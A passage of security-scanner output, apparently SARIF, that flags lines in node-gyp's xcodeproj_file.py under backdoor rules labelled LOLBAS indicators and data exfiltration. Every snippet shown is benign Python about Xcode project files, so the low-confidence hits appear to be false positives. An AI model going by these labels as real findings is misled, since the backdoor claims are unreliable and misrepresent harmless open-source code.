            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 19,
                  "endLine": 42,
                  "endColumn": 23,
                  "snippet": {
                    "text": "the \"isa\" property of each object.  A variety of classes are represented in a\nproject file.  Objects can refer to other objects by ID, using the 24-character\nhexadecimal object key.  A project's objects form a tree, with a root object\nof class PBXProject at the root.  As an example, the PBXProject object serves\nas parent to an XCConfigurationList object defining the build configurations\nused in the project, a PBXGroup object serving as a container for all files\nreferenced in the project, and a list of target objects, each of which defines\n",
                    "rendered": {
                      "text": "the \"isa\" property of each object.  A variety of classes are represented in a\nproject file.  Objects can refer to other objects by ID, using the 24-character\nhexadecimal object key.  A project's objects form a tree, with a root object\nof class PBXProject at the root.  As an example, the PBXProject object serves\nas parent to an XCConfigurationList object defining the build configurations\nused in the project, a PBXGroup object serving as a container for all files\nreferenced in the project, and a list of target objects, each of which defines\n",
                      "markdown": "`the \"isa\" property of each object.  A variety of classes are represented in a\nproject file.  Objects can refer to other objects by ID, using the 24-character\nhexadecimal object key.  A project's objects form a tree, with a root object\nof class PBXProject at the root.  As an example, the PBXProject object serves\nas parent to an XCConfigurationList object defining the build configurations\nused in the project, a PBXGroup object serving as a container for all files\nreferenced in the project, and a list of target objects, each of which defines\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 3121,
                  "startColumn": 13,
                  "endLine": 3121,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                    continue\n                remote_products.append(target._properties[\"productReference\"])\n\n            # Sort the PBXReferenceProxy children according to the list of remote\n            # products.\n            product_group = ref_dict[\"ProductGroup\"]\n            product_group._properties[\"children\"] = sorted(\n",
                    "rendered": {
                      "text": "                    continue\n                remote_products.append(target._properties[\"productReference\"])\n\n            # Sort the PBXReferenceProxy children according to the list of remote\n            # products.\n            product_group = ref_dict[\"ProductGroup\"]\n            product_group._properties[\"children\"] = sorted(\n",
                      "markdown": "`                    continue\n                remote_products.append(target._properties[\"productReference\"])\n\n            # Sort the PBXReferenceProxy children according to the list of remote\n            # products.\n            product_group = ref_dict[\"ProductGroup\"]\n            product_group._properties[\"children\"] = sorted(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 3109,
                  "startColumn": 27,
                  "endLine": 3109,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            y_index = remote_products.index(y_remote)\n\n            # Use the order of each remote PBXFileReference in remote_products to\n            # determine the sort order.\n            return cmp(x_index, y_index)\n\n        for other_pbxproject, ref_dict in self._other_pbxprojects.items():\n",
                    "rendered": {
                      "text": "            y_index = remote_products.index(y_remote)\n\n            # Use the order of each remote PBXFileReference in remote_products to\n            # determine the sort order.\n            return cmp(x_index, y_index)\n\n        for other_pbxproject, ref_dict in self._other_pbxprojects.items():\n",
                      "markdown": "`            y_index = remote_products.index(y_remote)\n\n            # Use the order of each remote PBXFileReference in remote_products to\n            # determine the sort order.\n            return cmp(x_index, y_index)\n\n        for other_pbxproject, ref_dict in self._other_pbxprojects.items():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 3097,
                  "startColumn": 16,
                  "endLine": 3097,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    def SortRemoteProductReferences(self):\n        # For each remote project file, sort the associated ProductGroup in the\n        # same order that the targets are sorted in the remote project file.  This\n        # is the sort order used by Xcode.\n\n        def CompareProducts(x, y, remote_products):\n            # x and y are PBXReferenceProxy objects.  Go through their associated\n",
                    "rendered": {
                      "text": "    def SortRemoteProductReferences(self):\n        # For each remote project file, sort the associated ProductGroup in the\n        # same order that the targets are sorted in the remote project file.  This\n        # is the sort order used by Xcode.\n\n        def CompareProducts(x, y, remote_products):\n            # x and y are PBXReferenceProxy objects.  Go through their associated\n",
                      "markdown": "`    def SortRemoteProductReferences(self):\n        # For each remote project file, sort the associated ProductGroup in the\n        # same order that the targets are sorted in the remote project file.  This\n        # is the sort order used by Xcode.\n\n        def CompareProducts(x, y, remote_products):\n            # x and y are PBXReferenceProxy objects.  Go through their associated\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 3095,
                  "startColumn": 39,
                  "endLine": 3095,
                  "endColumn": 45,
                  "snippet": {
                    "text": "                product_group.AppendChild(reference_proxy)\n\n    def SortRemoteProductReferences(self):\n        # For each remote project file, sort the associated ProductGroup in the\n        # same order that the targets are sorted in the remote project file.  This\n        # is the sort order used by Xcode.\n\n",
                    "rendered": {
                      "text": "                product_group.AppendChild(reference_proxy)\n\n    def SortRemoteProductReferences(self):\n        # For each remote project file, sort the associated ProductGroup in the\n        # same order that the targets are sorted in the remote project file.  This\n        # is the sort order used by Xcode.\n\n",
                      "markdown": "`                product_group.AppendChild(reference_proxy)\n\n    def SortRemoteProductReferences(self):\n        # For each remote project file, sort the associated ProductGroup in the\n        # same order that the targets are sorted in the remote project file.  This\n        # is the sort order used by Xcode.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2991,
                  "startColumn": 28,
                  "endLine": 2991,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            self._other_pbxprojects[other_pbxproject] = ref_dict\n            self.AppendProperty(\"projectReferences\", ref_dict)\n\n            # Xcode seems to sort this list case-insensitively\n            self._properties[\"projectReferences\"] = sorted(\n                self._properties[\"projectReferences\"],\n                key=lambda x: x[\"ProjectRef\"].Name().lower()\n",
                    "rendered": {
                      "text": "            self._other_pbxprojects[other_pbxproject] = ref_dict\n            self.AppendProperty(\"projectReferences\", ref_dict)\n\n            # Xcode seems to sort this list case-insensitively\n            self._properties[\"projectReferences\"] = sorted(\n                self._properties[\"projectReferences\"],\n                key=lambda x: x[\"ProjectRef\"].Name().lower()\n",
                      "markdown": "`            self._other_pbxprojects[other_pbxproject] = ref_dict\n            self.AppendProperty(\"projectReferences\", ref_dict)\n\n            # Xcode seems to sort this list case-insensitively\n            self._properties[\"projectReferences\"] = sorted(\n                self._properties[\"projectReferences\"],\n                key=lambda x: x[\"ProjectRef\"].Name().lower()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2911,
                  "startColumn": 33,
                  "endLine": 2911,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n            if group.Name() == \"Products\":\n                # The Products group is a special case.  Instead of sorting\n                # alphabetically, sort things in the order of the targets that\n                # produce the products.  To do this, just build up a new list of\n                # products based on the targets.\n                products = []\n",
                    "rendered": {
                      "text": "\n            if group.Name() == \"Products\":\n                # The Products group is a special case.  Instead of sorting\n                # alphabetically, sort things in the order of the targets that\n                # produce the products.  To do this, just build up a new list of\n                # products based on the targets.\n                products = []\n",
                      "markdown": "`\n            if group.Name() == \"Products\":\n                # The Products group is a special case.  Instead of sorting\n                # alphabetically, sort things in the order of the targets that\n                # produce the products.  To do this, just build up a new list of\n                # products based on the targets.\n                products = []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2902,
                  "startColumn": 9,
                  "endLine": 2902,
                  "endColumn": 15,
                  "snippet": {
                    "text": "            key=cmp_to_key(lambda x, y: x.CompareRootGroup(y)),\n        )\n\n        # Sort everything else by putting group before files, and going\n        # alphabetically by name within sections of groups and files.  SortGroup\n        # is recursive.\n        for group in self._properties[\"mainGroup\"]._properties[\"children\"]:\n",
                    "rendered": {
                      "text": "            key=cmp_to_key(lambda x, y: x.CompareRootGroup(y)),\n        )\n\n        # Sort everything else by putting group before files, and going\n        # alphabetically by name within sections of groups and files.  SortGroup\n        # is recursive.\n        for group in self._properties[\"mainGroup\"]._properties[\"children\"]:\n",
                      "markdown": "`            key=cmp_to_key(lambda x, y: x.CompareRootGroup(y)),\n        )\n\n        # Sort everything else by putting group before files, and going\n        # alphabetically by name within sections of groups and files.  SortGroup\n        # is recursive.\n        for group in self._properties[\"mainGroup\"]._properties[\"children\"]:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2895,
                  "startColumn": 9,
                  "endLine": 2895,
                  "endColumn": 15,
                  "snippet": {
                    "text": "                group.TakeOverOnlyChild(recurse)\n\n    def SortGroups(self):\n        # Sort the children of the mainGroup (like \"Source\" and \"Products\")\n        # according to their defined order.\n        self._properties[\"mainGroup\"]._properties[\"children\"] = sorted(\n            self._properties[\"mainGroup\"]._properties[\"children\"],\n",
                    "rendered": {
                      "text": "                group.TakeOverOnlyChild(recurse)\n\n    def SortGroups(self):\n        # Sort the children of the mainGroup (like \"Source\" and \"Products\")\n        # according to their defined order.\n        self._properties[\"mainGroup\"]._properties[\"children\"] = sorted(\n            self._properties[\"mainGroup\"]._properties[\"children\"],\n",
                      "markdown": "`                group.TakeOverOnlyChild(recurse)\n\n    def SortGroups(self):\n        # Sort the children of the mainGroup (like \"Source\" and \"Products\")\n        # according to their defined order.\n        self._properties[\"mainGroup\"]._properties[\"children\"] = sorted(\n            self._properties[\"mainGroup\"]._properties[\"children\"],\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2826,
                  "startColumn": 17,
                  "endLine": 2826,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        return self._GroupByName(\"Products\")\n\n    # IntermediatesGroup is used to collect source-like files that are generated\n    # by rules or script phases and are placed in intermediate directories such\n    # as DerivedSources.\n    def IntermediatesGroup(self):\n        return self._GroupByName(\"Intermediates\")\n",
                    "rendered": {
                      "text": "        return self._GroupByName(\"Products\")\n\n    # IntermediatesGroup is used to collect source-like files that are generated\n    # by rules or script phases and are placed in intermediate directories such\n    # as DerivedSources.\n    def IntermediatesGroup(self):\n        return self._GroupByName(\"Intermediates\")\n",
                      "markdown": "`        return self._GroupByName(\"Products\")\n\n    # IntermediatesGroup is used to collect source-like files that are generated\n    # by rules or script phases and are placed in intermediate directories such\n    # as DerivedSources.\n    def IntermediatesGroup(self):\n        return self._GroupByName(\"Intermediates\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1191,
                  "startColumn": 22,
                  "endLine": 1191,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        hashables = XCHierarchicalElement.Hashables(self)\n\n        # It is not sufficient to just rely on name and parent to build a unique\n        # hashable : a node could have two child PBXGroup sharing a common name.\n        # To add entropy the hashable is enhanced with the names of all its\n        # children.\n        for child in self._properties.get(\"children\", []):\n",
                    "rendered": {
                      "text": "        hashables = XCHierarchicalElement.Hashables(self)\n\n        # It is not sufficient to just rely on name and parent to build a unique\n        # hashable : a node could have two child PBXGroup sharing a common name.\n        # To add entropy the hashable is enhanced with the names of all its\n        # children.\n        for child in self._properties.get(\"children\", []):\n",
                      "markdown": "`        hashables = XCHierarchicalElement.Hashables(self)\n\n        # It is not sufficient to just rely on name and parent to build a unique\n        # hashable : a node could have two child PBXGroup sharing a common name.\n        # To add entropy the hashable is enhanced with the names of all its\n        # children.\n        for child in self._properties.get(\"children\", []):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1079,
                  "startColumn": 20,
                  "endLine": 1079,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            # If the two objects are of the same sort rank, compare their names.\n            return cmp(self.Name(), other.Name())\n\n        # Otherwise, sort groups before everything else.\n        if self_type == \"group\":\n            return -1\n        return 1\n",
                    "rendered": {
                      "text": "            # If the two objects are of the same sort rank, compare their names.\n            return cmp(self.Name(), other.Name())\n\n        # Otherwise, sort groups before everything else.\n        if self_type == \"group\":\n            return -1\n        return 1\n",
                      "markdown": "`            # If the two objects are of the same sort rank, compare their names.\n            return cmp(self.Name(), other.Name())\n\n        # Otherwise, sort groups before everything else.\n        if self_type == \"group\":\n            return -1\n        return 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1076,
                  "startColumn": 48,
                  "endLine": 1076,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        other_type = valid_class_types[other.__class__]\n\n        if self_type == other_type:\n            # If the two objects are of the same sort rank, compare their names.\n            return cmp(self.Name(), other.Name())\n\n        # Otherwise, sort groups before everything else.\n",
                    "rendered": {
                      "text": "        other_type = valid_class_types[other.__class__]\n\n        if self_type == other_type:\n            # If the two objects are of the same sort rank, compare their names.\n            return cmp(self.Name(), other.Name())\n\n        # Otherwise, sort groups before everything else.\n",
                      "markdown": "`        other_type = valid_class_types[other.__class__]\n\n        if self_type == other_type:\n            # If the two objects are of the same sort rank, compare their names.\n            return cmp(self.Name(), other.Name())\n\n        # Otherwise, sort groups before everything else.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 1065,
                  "startColumn": 68,
                  "endLine": 1065,
                  "endColumn": 74,
                  "snippet": {
                    "text": "        return hashables\n\n    def Compare(self, other):\n        # Allow comparison of these types.  PBXGroup has the highest sort rank;\n        # PBXVariantGroup is treated as equal to PBXFileReference.\n        valid_class_types = {\n            PBXFileReference: \"file\",\n",
                    "rendered": {
                      "text": "        return hashables\n\n    def Compare(self, other):\n        # Allow comparison of these types.  PBXGroup has the highest sort rank;\n        # PBXVariantGroup is treated as equal to PBXFileReference.\n        valid_class_types = {\n            PBXFileReference: \"file\",\n",
                      "markdown": "`        return hashables\n\n    def Compare(self, other):\n        # Allow comparison of these types.  PBXGroup has the highest sort rank;\n        # PBXVariantGroup is treated as equal to PBXFileReference.\n        valid_class_types = {\n            PBXFileReference: \"file\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 571,
                  "startColumn": 28,
                  "endLine": 572,
                  "snippet": {
                    "text": "        #     9 ^I HT  is encoded as \"\\t\"\n        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n        # 31 inclusive) are encoded as \"\\U001f\" referring to the Unicode code point\n        # in hexadecimal.  For example, character 14 (^N SO) is encoded as \"\\U000e\".\n        # Characters above the ASCII range are passed through to the output encoded\n",
                    "rendered": {
                      "text": "        #     9 ^I HT  is encoded as \"\\t\"\n        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n        # 31 inclusive) are encoded as \"\\U001f\" referring to the Unicode code point\n        # in hexadecimal.  For example, character 14 (^N SO) is encoded as \"\\U000e\".\n        # Characters above the ASCII range are passed through to the output encoded\n",
                      "markdown": "`        #     9 ^I HT  is encoded as \"\\t\"\n        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n        # 31 inclusive) are encoded as \"\\U001f\" referring to the Unicode code point\n        # in hexadecimal.  For example, character 14 (^N SO) is encoded as \"\\U000e\".\n        # Characters above the ASCII range are passed through to the output encoded\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 569,
                  "startColumn": 18,
                  "endLine": 569,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        #    13 ^M CR  is passed through as-is without escaping\n        #  - In other objects:\n        #     9 ^I HT  is encoded as \"\\t\"\n        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n",
                    "rendered": {
                      "text": "        #    13 ^M CR  is passed through as-is without escaping\n        #  - In other objects:\n        #     9 ^I HT  is encoded as \"\\t\"\n        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n",
                      "markdown": "`        #    13 ^M CR  is passed through as-is without escaping\n        #  - In other objects:\n        #     9 ^I HT  is encoded as \"\\t\"\n        #    10 ^J NL  is encoded as \"\\n\"\n        #    13 ^M CR  is encoded as \"\\n\" rendering it indistinguishable from\n        #              10 ^J NL\n        # All other characters within the ASCII control character range (0 through\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 565,
                  "startColumn": 18,
                  "endLine": 565,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        #   127 ^? DEL is passed through as-is without escaping\n        #  - In PBXFileReference and PBXBuildFile objects:\n        #     9 ^I HT  is passed through as-is without escaping\n        #    10 ^J NL  is passed through as-is without escaping\n        #    13 ^M CR  is passed through as-is without escaping\n        #  - In other objects:\n        #     9 ^I HT  is encoded as \"\\t\"\n",
                    "rendered": {
                      "text": "        #   127 ^? DEL is passed through as-is without escaping\n        #  - In PBXFileReference and PBXBuildFile objects:\n        #     9 ^I HT  is passed through as-is without escaping\n        #    10 ^J NL  is passed through as-is without escaping\n        #    13 ^M CR  is passed through as-is without escaping\n        #  - In other objects:\n        #     9 ^I HT  is encoded as \"\\t\"\n",
                      "markdown": "`        #   127 ^? DEL is passed through as-is without escaping\n        #  - In PBXFileReference and PBXBuildFile objects:\n        #     9 ^I HT  is passed through as-is without escaping\n        #    10 ^J NL  is passed through as-is without escaping\n        #    13 ^M CR  is passed through as-is without escaping\n        #  - In other objects:\n        #     9 ^I HT  is encoded as \"\\t\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 56,
                  "endLine": 253,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    _hashables: A list of XCObject subclasses that can be hashed by ComputeIDs\n                to construct this object's ID.  Most classes that need custom\n                hashing behavior should do it by overriding Hashables,\n                but in some cases an object's parent may wish to push a\n                hashable value into its child, and it can do so by appending\n                to _hashables.\n  Attributes:\n",
                    "rendered": {
                      "text": "    _hashables: A list of XCObject subclasses that can be hashed by ComputeIDs\n                to construct this object's ID.  Most classes that need custom\n                hashing behavior should do it by overriding Hashables,\n                but in some cases an object's parent may wish to push a\n                hashable value into its child, and it can do so by appending\n                to _hashables.\n  Attributes:\n",
                      "markdown": "`    _hashables: A list of XCObject subclasses that can be hashed by ComputeIDs\n                to construct this object's ID.  Most classes that need custom\n                hashing behavior should do it by overriding Hashables,\n                but in some cases an object's parent may wish to push a\n                hashable value into its child, and it can do so by appending\n                to _hashables.\n  Attributes:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 244,
                  "startColumn": 62,
                  "endLine": 244,
                  "endColumn": 68,
                  "snippet": {
                    "text": "                        used to represent the character in the output.  XCObject\n                        provides an _encode_transforms list suitable for most\n                        XCObject subclasses.\n    _alternate_encode_transforms: Provided for subclasses that wish to use\n                                  the alternate encoding rules.  Xcode seems\n                                  to use these rules when printing objects in\n                                  single-line format.  Subclasses that desire\n",
                    "rendered": {
                      "text": "                        used to represent the character in the output.  XCObject\n                        provides an _encode_transforms list suitable for most\n                        XCObject subclasses.\n    _alternate_encode_transforms: Provided for subclasses that wish to use\n                                  the alternate encoding rules.  Xcode seems\n                                  to use these rules when printing objects in\n                                  single-line format.  Subclasses that desire\n",
                      "markdown": "`                        used to represent the character in the output.  XCObject\n                        provides an _encode_transforms list suitable for most\n                        XCObject subclasses.\n    _alternate_encode_transforms: Provided for subclasses that wish to use\n                                  the alternate encoding rules.  Xcode seems\n                                  to use these rules when printing objects in\n                                  single-line format.  Subclasses that desire\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 16,
                  "endLine": 95,
                  "endColumn": 22,
                  "snippet": {
                    "text": "to select any identifier, even at random, to refer to the objects it creates,\nand Xcode will retain those identifiers and use them when subsequently\nrewriting the project file.  However, the generator would choose new random\nidentifiers each time the project files are generated, leading to difficulties\ncomparing \"used\" project files to \"pristine\" ones produced by this module,\nand causing the appearance of changes as every object identifier is changed\nwhen updated projects are checked in to a version control repository.  To\n",
                    "rendered": {
                      "text": "to select any identifier, even at random, to refer to the objects it creates,\nand Xcode will retain those identifiers and use them when subsequently\nrewriting the project file.  However, the generator would choose new random\nidentifiers each time the project files are generated, leading to difficulties\ncomparing \"used\" project files to \"pristine\" ones produced by this module,\nand causing the appearance of changes as every object identifier is changed\nwhen updated projects are checked in to a version control repository.  To\n",
                      "markdown": "`to select any identifier, even at random, to refer to the objects it creates,\nand Xcode will retain those identifiers and use them when subsequently\nrewriting the project file.  However, the generator would choose new random\nidentifiers each time the project files are generated, leading to difficulties\ncomparing \"used\" project files to \"pristine\" ones produced by this module,\nand causing the appearance of changes as every object identifier is changed\nwhen updated projects are checked in to a version control repository.  To\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcodeproj_file.py"
                },
                "region": {
                  "startLine": 2290,
                  "startColumn": 31,
                  "endLine": 2290,
                  "endColumn": 36,
                  "snippet": {
